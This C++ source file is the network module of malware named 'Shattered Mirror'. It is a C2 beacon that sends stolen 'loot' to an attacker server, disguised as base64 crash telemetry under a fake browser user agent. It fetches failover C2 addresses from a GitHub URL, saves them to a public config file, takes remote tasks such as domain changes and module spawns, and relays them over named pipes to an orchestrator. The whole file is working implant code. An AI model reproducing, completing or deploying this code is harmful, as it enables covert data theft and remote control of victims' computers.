/*=============================================================================
 * Shattered Mirror v1 — Atom 01: Network Communicator
 * OPTION B: Dual pipes – receives forwarded reports on command pipe,
 *            sends telemetry directly to C2 via WinHTTP.
 *===========================================================================*/

#include "Atom_01_Net.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstdio>
#include <ctime>
#include <string>

#pragma comment(lib, "winhttp.lib")

/* --- FAILOVER STATE --- */
static char  s_ActiveDomain[256] = {0};
static int   s_ActivePort = 0;

static char g_PrimaryDomain[256] = {0};
static int g_PrimaryPort = 0;

static void LoadC2Config() {
    FILE *f = fopen("C:\\Users\\Public\\sm_net.cfg", "r");
    if (f) {
        if (fscanf(f, "%255[^:]:%d", g_PrimaryDomain, &g_PrimaryPort) != 2) {
            strcpy_s(g_PrimaryDomain, Config::C2_DOMAIN);
            g_PrimaryPort = Config::PUBLIC_PORT;
        }
        fclose(f);
    } else {
        strcpy_s(g_PrimaryDomain, Config::C2_DOMAIN);
        g_PrimaryPort = Config::PUBLIC_PORT;
    }
}

static void SaveC2Config(const char *domain, int port) {
    FILE *f = fopen("C:\\Users\\Public\\sm_net.cfg", "w");
    if (f) {
        fprintf(f, "%s:%d", domain, port);
        fclose(f);
    }
    strcpy_s(g_PrimaryDomain, domain);
    g_PrimaryPort = port;
}

/*---------------------------------------------------------------------------
 *  FetchFailoverConfig
 *  Downloads raw text from a GitHub URL: "IP:PORT" format.
 *  Returns TRUE if we got a new valid config.
 *-------------------------------------------------------------------------*/
static BOOL FetchFailoverConfig(char *szDomainOut, int *pPortOut) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return FALSE;

    // Parse the failover URL into components
    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    WCHAR szHost[256] = {0}, szPath[512] = {0};
    urlComp.lpszHostName = szHost;
    urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = szPath;
    urlComp.dwUrlPathLength = 512;

    WCHAR wUrl[512] = {0};
    MultiByteToWideChar(CP_ACP, 0, Config::FAILOVER_URL, -1, wUrl, 512);

    if (!WinHttpCrackUrl(wUrl, 0, 0, &urlComp)) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, szHost,
        (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? 443 : 80, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", szPath, NULL, NULL, NULL,
        (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    BOOL bResult = FALSE;
    if (WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            char buf[256] = {0};
            DWORD dwRead = 0;
            WinHttpReadData(hRequest, buf, sizeof(buf) - 1, &dwRead);
            buf[dwRead] = '\0';

            // Trim whitespace/newlines
            for (int i = (int)dwRead - 1; i >= 0; i--) {
                if (buf[i] == '\n' || buf[i] == '\r' || buf[i] == ' ') buf[i] = '\0';
                else break;
            }

            // Parse "IP:PORT"
            char *colon = strchr(buf, ':');
            if (colon) {
                *colon = '\0';
                strcpy_s(szDomainOut, 256, buf);
                *pPortOut = atoi(colon + 1);
                bResult = TRUE;
            }
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return bResult;
}

/* Helper to convert simple strings for JSON (Base64 Encode) */
static void Base64Encode(const BYTE *pBuf, DWORD dwLen, char *szOut) {
  if (!pBuf || !szOut)
    return;
  static const char cb64[] =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

  int i, j;
  for (i = 0, j = 0; i < (int)dwLen; i += 3) {
    int v = pBuf[i];
    v = (v << 8) | (i + 1 < (int)dwLen ? pBuf[i + 1] : 0);
    v = (v << 8) | (i + 2 < (int)dwLen ? pBuf[i + 2] : 0);
    szOut[j++] = cb64[(v >> 18) & 0x3F];
    szOut[j++] = cb64[(v >> 12) & 0x3F];
    if (i + 1 < (int)dwLen)
      szOut[j++] = cb64[(v >> 6) & 0x3F];
    else
      szOut[j++] = '=';
    if (i + 2 < (int)dwLen)
      szOut[j++] = cb64[v & 0x3F];
    else
      szOut[j++] = '=';
  }
  szOut[j] = '\0';
}

/*---------------------------------------------------------------------------
 *  TransmitPulse
 *  Sends telemetry (or loot) to C2, retrieves any pending task.
 *-------------------------------------------------------------------------*/
BOOL TransmitPulse(const BYTE *pOptionalLoot, DWORD dwLength, DWORD dwAtomId, char *szTaskOut,
                   DWORD dwMaxTask) {
  HINTERNET hSession =
      WinHttpOpen(L"Mozilla/5.0 (Windows)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                  NULL, NULL, 0);
  if (!hSession)
    return FALSE;

  WCHAR wDomain[256] = {0};
  const char *activeDomain = (s_ActiveDomain[0] != '\0') ? s_ActiveDomain : g_PrimaryDomain;
  int activePort = (s_ActivePort > 0) ? s_ActivePort : g_PrimaryPort;

  MultiByteToWideChar(CP_ACP, 0, activeDomain, -1, wDomain, 256);
  HINTERNET hConnect =
      WinHttpConnect(hSession, wDomain, (INTERNET_PORT)activePort, 0);
  if (!hConnect) {
    WinHttpCloseHandle(hSession);
    return FALSE;
  }

  HINTERNET hRequest = WinHttpOpenRequest(
      hConnect, L"POST", L"/api/v2/telemetry", NULL, NULL, NULL,
      (activePort == 443 ? WINHTTP_FLAG_SECURE : 0));
  if (!hRequest) {
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return FALSE;
  }

  std::wstring headers =
      L"Content-Type: application/json\r\nX-Telemetry-ID: " +
      std::wstring(Config::PSK_ID, Config::PSK_ID + strlen(Config::PSK_ID)) +
      L"\r\n";
  WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1,
                           WINHTTP_ADDREQ_FLAG_ADD);

  char szJsonBody[24576] =
      "{ \"report_id\": \"hb_pulse\", \"diagnostic_blob\": \"\" }";
  if (pOptionalLoot && dwLength > 0) {
    char *szB64 = (char *)malloc(((dwLength + 2) / 3) * 4 + 1);
    if (szB64) {
      Base64Encode(pOptionalLoot, dwLength, szB64);
      snprintf(szJsonBody, sizeof(szJsonBody),
               "{\"report_id\":\"user_crash_01\",\"diagnostic_blob\":\"%s\",\"atom_id\":%lu}",
               szB64, dwAtomId);
      free(szB64);
    }
  }

  if (WinHttpSendRequest(hRequest, NULL, 0, (LPVOID)szJsonBody,
                         (DWORD)strlen(szJsonBody), (DWORD)strlen(szJsonBody),
                         0)) {
    if (WinHttpReceiveResponse(hRequest, NULL)) {
      DWORD dwSize = 0;
      if (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0) {
        if (dwSize < dwMaxTask) {
          WinHttpReadData(hRequest, (LPVOID)szTaskOut, dwSize, &dwSize);
          szTaskOut[dwSize] = '\0';
        }
      }
    }
  }

  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  return TRUE;
}

/*---------------------------------------------------------------------------
 *  NetworkAtomMain (Dual Pipes)
 *-------------------------------------------------------------------------*/
DWORD WINAPI NetworkAtomMain(LPVOID lpParam) {
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;

  // 1. Connect to command pipe (receive forwarded reports and tasks from
  // Orchestrator)
  HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  if (!hCmdPipe) {
    // Network atom cannot function without command pipe
    return 1;
  }

  // 2. Connect to report pipe (send CMD_READY and status to Orchestrator)
  HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  if (!hReportPipe) {
    CloseHandle(hCmdPipe);
    return 1;
  }

  BYTE SharedSessionKey[16];
  memcpy(SharedSessionKey, Config::PSK_ID, 16);

  // Send CMD_READY on report pipe
  IPC_MESSAGE readyMsg = {0};
  readyMsg.dwSignature = 0x534D4952;
  readyMsg.CommandId = CMD_READY;
  readyMsg.dwPayloadLen = 0;
  IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);

  LoadC2Config();

  while (TRUE) {
    char szTaskBuffer[2048] = {0};

    // 1. ALWAYS Try Primary C2 first
    s_ActiveDomain[0] = '\0'; 
    s_ActivePort = 0;
    
    BOOL bPulseOk = TransmitPulse(NULL, 0, 0, szTaskBuffer, 2048);

    if (!bPulseOk) {
        // 2. Primary failed. Instantly check GitHub without waiting.
        char newDomain[256] = {0};
        int  newPort = 0;
        if (FetchFailoverConfig(newDomain, &newPort)) {
            // We got the config! Let's try it immediately.
            strcpy_s(s_ActiveDomain, newDomain);
            s_ActivePort = newPort;
            
            bPulseOk = TransmitPulse(NULL, 0, 0, szTaskBuffer, 2048);
        }
        
        // Next loop will instantly reset and try Primary again.
    }

    // 2. Process any C2 task received (could be spawn commands or SET_DOMAIN)
    auto ProcessIncomingTask = [&](char* buffer, HANDLE hReport) {
        if (strlen(buffer) > 0) {
            // Check for direct SET_DOMAIN command
            if (strncmp(buffer, "SET_DOMAIN:", 11) == 0) {
                char *args = buffer + 11;
                char *colon = strchr(args, ':');
                if (colon) {
                    *colon = '\0';
                    SaveC2Config(args, atoi(colon + 1));
                    memset(buffer, 0, 2048);
                    return;
                }
            }

            if (strstr(buffer, "\"atom_id\"")) {
                char *pAtom = strstr(buffer, "\"atom_id\"");
                char *pPayload = strstr(buffer, "\"payload\"");

                if (pAtom && pPayload) {
                    char *pAtomColon = strchr(pAtom, ':');
                    char *pPayloadColon = strchr(pPayload, ':');

                    if (pAtomColon && pPayloadColon) {
                        int atom_id = atoi(pAtomColon + 1);

                        char *pPayloadStart = strchr(pPayloadColon, '"');
                        if (pPayloadStart) {
                            pPayloadStart++;
                            char *pPayloadEnd = strchr(pPayloadStart, '"');

                            if (pPayloadEnd) {
                                DWORD dwLen = (DWORD)(pPayloadEnd - pPayloadStart);
                                char payloadData[2048] = {0};
                                memcpy(payloadData, pPayloadStart, dwLen);

                                if (atom_id == 1 && strncmp(payloadData, "SET_DOMAIN:", 11) == 0) {
                                    char *args = payloadData + 11;
                                    char *colon = strchr(args, ':');
                                    if (colon) {
                                        *colon = '\0';
                                        SaveC2Config(args, atoi(colon + 1));
                                    }
                                } else {
                                    char formattedPayload[2048] = {0};
                                    snprintf(formattedPayload, sizeof(formattedPayload), "%d:%.*s", atom_id, (int)dwLen, pPayloadStart);

                                    IPC_MESSAGE taskMsg = {0};
                                    taskMsg.dwSignature = 0x534D4952;
                                    taskMsg.CommandId = CMD_SPAWN_ATOM;
                                    taskMsg.AtomId = 1; 
                                    taskMsg.dwPayloadLen = (DWORD)strlen(formattedPayload);

                                    if (taskMsg.dwPayloadLen > MAX_IPC_PAYLOAD_SIZE - 1) {
                                        taskMsg.dwPayloadLen = MAX_IPC_PAYLOAD_SIZE - 1;
                                    }

                                    memcpy(taskMsg.Payload, formattedPayload, taskMsg.dwPayloadLen);
                                    IPC_SendMessage(hReport, &taskMsg, SharedSessionKey, 16);
                                }
                                memset(buffer, 0, 2048); // Clear after processing
                            }
                        }
                    }
                }
            }
        }
    };

    ProcessIncomingTask(szTaskBuffer, hReportPipe);

    // 3. Check pipes for forwarded reports and direct commands
    DWORD dwSlept = 0;
    DWORD dwWait = 2000;
    while (dwSlept < dwWait) {
      // Check Report Pipe (Forwarded Reports)
      DWORD dwAvail = 0;
      if (PeekNamedPipe(hReportPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
        IPC_MESSAGE inMsg = {0};
        if (IPC_ReceiveMessage(hReportPipe, &inMsg, SharedSessionKey, 16)) {
            if (inMsg.CommandId == CMD_FORWARD_REPORT) {
              TransmitPulse(inMsg.Payload, inMsg.dwPayloadLen, inMsg.AtomId, szTaskBuffer, 2048);
              ProcessIncomingTask(szTaskBuffer, hReportPipe);
            }
        }
      }

      // Check Command Pipe (Direct Instructions like SET_DOMAIN from Bale)
      if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
        IPC_MESSAGE inMsg = {0};
        if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
            if (inMsg.CommandId == CMD_EXECUTE) {
                char cmdBuffer[2048] = {0};
                memcpy(cmdBuffer, inMsg.Payload, min((DWORD)2047, inMsg.dwPayloadLen));
                ProcessIncomingTask(cmdBuffer, hReportPipe);
            }
        }
      }

      Sleep(200);
      dwSlept += 200;
    }
  }

  CloseHandle(hCmdPipe);
  CloseHandle(hReportPipe);
  return 0;
}